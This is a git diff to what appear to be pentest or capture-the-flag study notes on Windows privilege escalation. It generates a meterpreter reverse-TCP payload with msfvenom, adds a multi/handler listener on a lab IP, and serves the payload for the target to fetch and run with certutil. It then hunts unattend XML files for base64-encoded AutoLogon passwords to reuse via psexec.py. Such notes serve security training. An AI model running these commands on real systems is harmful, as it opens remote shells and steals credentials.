@@ -1166,12 +1166,28 @@ Exploitation Steps:
 ##### Generate a meterpreter payload using MSFVenom
 
 MSFVenom is used for generating payloads for a reverse shell.
+
 ```
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.66.82 LPORT=4321 -f exe > payload.exe
 ```
 - `-p` = Payload
 - `-LHOST`/`LPORT` = Attack machine's IP and port
 - `-f` = file type
+
+##### Setup a listener for the payload using the multi/handler module
+
+Next,  to setup a handler that would wait for the connection from the msfvenom payload. Set the configured payload to the one set from msfvenom. For this example, we used `windows/meterpreter/reverse_tcp`. Next, we'll need to set the `LHOST`/`LPORT` to the same one specified in the payload:
+
+```
+service postgresql start && msfconsole
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.10.66.82
+set LPORT 4321
+run
+```
+
+ This will start the listener. When the payload is executed on the target it will connect back here.
 
 ##### Host a website for the payload.exe
 
@@ -1181,15 +1197,15 @@ We'd normally try to establish initial access by exploiting a service but we can
 python -m SimpleHTTPServer 80
 ```
 
-You can use the `certutil` command on the windows system to download the payload.
+If we already have access to the system, we can use the `certutil` command on the target windows system to download the payload and then execute it.
 ```
 certutil -urlcache -f http://<server_ip>/payload.exe payload.exe
 ```
 
-Use could try to use meterpreter's in-built search to search for the type of files you're interested in.
+After the payload runs, the meterpreter session should start. Use could try to use meterpreter's in-built search to search for the type of files you're interested in.
 
 ```
-search -f <file>.txt
+search -f <file>.xml
 ```
 
 Look for `<AutoLogon>` tag, this should have hard-coded credentials. We'd know any password is encoded if the `<PlainText>` tag is set to false.
@@ -1211,7 +1227,7 @@ Use kali's base64 decoder to extract the credentials. You can output using `-o` 
 base64 -d password.txt 
 ```
 
-The password could be used through something like PsExec
+The password could be used through something like PsExec.
 #### Psexec Python Script
 
 Psexec is a windows executable which can't be ran on a Linux system. We can use the `psexec.py` which is a python implementation of the software. 
